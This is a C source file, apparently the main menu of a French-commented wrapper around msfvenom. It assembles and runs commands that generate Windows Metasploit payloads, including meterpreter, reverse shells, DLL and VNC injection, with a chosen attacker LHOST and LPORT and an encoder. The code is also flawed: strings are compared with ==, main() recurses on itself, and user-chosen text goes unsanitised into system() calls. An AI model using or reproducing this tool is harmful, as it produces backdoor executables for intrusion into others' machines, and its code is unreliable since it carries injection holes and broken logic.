#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "globalVar.h"
#include "banner.h"
#include "platform.h"
#include "payloadType.h"
#include "payloadTypeAutre.h"
#include "payloadTypeDllinject.h"
#include "payloadTypeEncryptShell.h"
#include "payloadTypeMeterpreter.h"
#include "payloadTypePatchupdllinject.h"
#include "payloadTypePatchupmeterpreter.h"
#include "payloadTypeShell.h"
#include "payloadTypeUpexec.h"
#include "payloadTypeVncinject.h"
#include "payloadTypeX64.h"
#include "lhostlportt.h"
#include "payloadTypeArch.h"
#include "payloadTypeEncoder.h"
#include "payloadFormatExe.h"
#include "quickpayload.h"

#define clear() printf("\033[H\033[J")

char* concat(const char *s1, const char *s2)
{
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}


int main()
{
	
	Choice = InterChoices();
	
	if (Choice =="quick")
	{
		int selectVal	=0;
		int loopWhile1	=1;

		while(loopWhile1 == 1)
		{
			banner();
			char* quickpayloadhelp = selectquickpayloadhelp();
			//printf("%s",quickpayload_2);

			if(quickpayloadhelp==quickpayload_1)
			{
				banner();
				show_msfv_archs();
				loopWhile1 = 1;
			
			}
			else if(quickpayloadhelp==quickpayload_2)
			{
			
				banner();
				show_msfv_platforms();
				loopWhile1 = 1;	
			}
			else if(quickpayloadhelp==quickpayload_3)
			{
			
				banner();
				char* payloadmsfv = selectpayloadmsfv();
				if (payloadmsfv != "")
				{
					printf("%s","\n");
					payloadmsfv=concat("msfvenom --list payloads | grep ",payloadmsfv);
					printf(Green);
					printf("%s","Commande : ");
					printf(white);
					printf("%s",payloadmsfv);
					printf("%s","\n\n");
					printf(white);
					printf("%s","Please waite while loading...\n");
					printf(BlueF);
					printf("%s"," \n");
					system(payloadmsfv);
					int selectVal3	=0;
					int loopWhile3	=1;
					while(loopWhile3 == 1)
					{
						printf(white);
						printf("%s","\nType [0] to exit : ");
						scanf("%d", &selectVal3);
						
						switch(selectVal3) 
						{
							case 0 :
							 	loopWhile3=0;
								break;

						      	default :
							 	loopWhile3=1;
						}
					}
				}
				loopWhile1 = 1;	
			}
	
			else if(quickpayloadhelp==quickpayload_6)
			{
			
				banner();
				show_msfv_encoders();
				loopWhile1 = 1;	
			}
			else if(quickpayloadhelp==quickpayload_11)
			{
			
				banner();
				show_msfv_formats();
				loopWhile1 = 1;	
			}
			
			
			else { loopWhile1=0;}
	
		}
		Choice ="";	
		system("clear");
		main();

	}
	else if (Choice =="SBS")
	{
		platformSelected=selectPlatform();
		if (platformSelected =="windows")
		{	
			// Type de payload à sélectionner
			char* payloadTypeSelected = selectPayloadType();

			// selon les cas full payload à sélectionner
			if(payloadTypeSelected=="autre") 
			{
				char* TypeAutre = selectPayloadTypeAutre();
				// si on est sur type autre
				if(TypeAutre=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeAutre);
			}
			else if(payloadTypeSelected=="dllinject") 
			{		
				char* TypeDllinject = selectPayloadTypeDllinject();
				// si on est sur type dllinject
				if(TypeDllinject=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeDllinject);
			}
			else if(payloadTypeSelected=="encrypted_shell") 
			{
				char* TypeEncryptShell= selectPayloadTypeEncryptShell();
				// si on est sur type encrypt shell
				if(TypeEncryptShell=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeEncryptShell);

			}
			else if(payloadTypeSelected=="meterpreter") 
			{
				char* TypeMeterpreter= selectPayloadTypeMeterpreter();
				// si on est sur type meterpreter
				if(TypeMeterpreter=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeMeterpreter);
			}
			else if(payloadTypeSelected=="patchupdllinject") 
			{
				char* TypePatchupddlinject= selectPayloadTypePatchupddlinject();
				// si on est sur type patchupdllinject
				if(TypePatchupddlinject=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypePatchupddlinject);
			}
			else if(payloadTypeSelected=="patchupmeterperter") 
			{
				char* TypePatchupMeterperter= selectPayloadTypePatchupMeterpreter();
				// si on est sur type patchupmeterperter
				if(TypePatchupMeterperter=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypePatchupMeterperter);
			}
			else if(payloadTypeSelected=="shell") 
			{
				char* TypeSell= selectPayloadTypeSell();
				// si on est sur type shell
				if(TypeSell=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeSell);
			}
			else if(payloadTypeSelected=="upexec") 
			{
				char* TypeUpexec= selectPayloadTypeUpexec();
				// si on est sur type upexec
				if(TypeUpexec=="exit") {main();}
				payloadBuild = concat(payloadBuild, TypeUpexec);
			}
			else if(payloadTypeSelected=="vncinject") 
			{
				char* Typevncinject= selectPayloadTypevncinject();
				// si on est sur type vncinject
				if(Typevncinject=="exit") {main();}
				payloadBuild = concat(payloadBuild, Typevncinject);
			}
			else if(payloadTypeSelected=="x64") 
			{
				char* Typex64= selectPayloadTypeX64();
				// si on est sur type x64
				if(Typex64=="exit") {main();}
				payloadBuild = concat(payloadBuild, Typex64);
			}


			else if(payloadTypeSelected=="exit") {main();}
	 
		}
		
		// Type lhost
		selectLHOST();
		payloadBuild = concat(payloadBuild, lhostBuild);
		payloadBuild = concat(payloadBuild, lhost);

		// Type lport
		selectLPOST();
		payloadBuild = concat(payloadBuild, lportBuild);
		payloadBuild = concat(payloadBuild, lport);
		
		{
			// Type Proc architecture
			char* TypeArch= selectArch();
			// si on est sur type x64
			if(TypeArch=="exit") {payloadBuild="msfvenom -p ";  main();}
			payloadBuild = concat(payloadBuild, payloadArch);
			payloadBuild = concat(payloadBuild, TypeArch);

			// Add Platform
			payloadBuild = concat(payloadBuild, payloadPlatform);
			payloadBuild = concat(payloadBuild, platform);

			// Type Encoder
			char* TypeEncoder= selectPayloadEncoder();
			// si on est sur type upexec
			if(TypeEncoder=="exit") {payloadBuild="msfvenom -p ";  main();main();}
			payloadBuild = concat(payloadBuild, TypeEncoder);

			// Type iterations
			selectIterations();
			payloadBuild = concat(payloadBuild, iteratesBuild);
			payloadBuild = concat(payloadBuild, iterates);

			// Type Noops
			selectNoops();
			payloadBuild = concat(payloadBuild, noopsBuild);
			payloadBuild = concat(payloadBuild, noops);

		}

		// Type executable formats
		char* TypeFormatsExe= selectExeformats();
		if(TypeFormatsExe=="exit") {payloadBuild="msfvenom -p ";  main();main();}
		payloadBuild = concat(payloadBuild, TypeFormatsExe);

		// Type name file
		selectNameFile();
		payloadBuild = concat(payloadBuild, filenameBuild);

		// chemin vers le dossier output
		
		char cwd[500];
		char folder[10] = "/output/"; 
		   if (getcwd(cwd, sizeof(cwd)) != NULL) {
		       printf("Current working dir: %s\n", cwd);
			payloadBuild = concat(payloadBuild, cwd);
			payloadBuild = concat(payloadBuild, folder);
			payloadBuild = concat(payloadBuild, filename);
		   } else {
		       perror("getcwd() error");
		       return 1;
		   }
		
		// Show banner end
		banner();
	 	
		// demande exécution de la commande
		char* exec= createPayload();
		if(exec=="exit") {payloadBuild="msfvenom -p ";  main();}
		else
		{
			struct stat file_stat;
			pathoutput = concat(cwd,folder);
			if (stat(pathoutput,&file_stat) < 0) 
			{
				mkdirB= concat(mkdirB,cwd);
				mkdirB= concat(mkdirB,folder);
			 	system(mkdirB);
			}
			
	
			printf("\nPlease wait while creating payload...\n\n");
			printf(BlueF);
			system(payloadBuild);
			printf(white);
			printf("\n");

			int selectVal4	=0;
			int loopWhile4	=1;

			printf(white);
			printf("%s","\nType [0] to exit : ");
			scanf("%d", &selectVal4);
					
			switch(selectVal4) 
			{
				case 0 :
				 	loopWhile4=0;
					break;
				      	default :
				 	loopWhile4=1;
			}

		}
	}
	Choice="";
	payloadBuild="msfvenom -p "; 
	main();

}

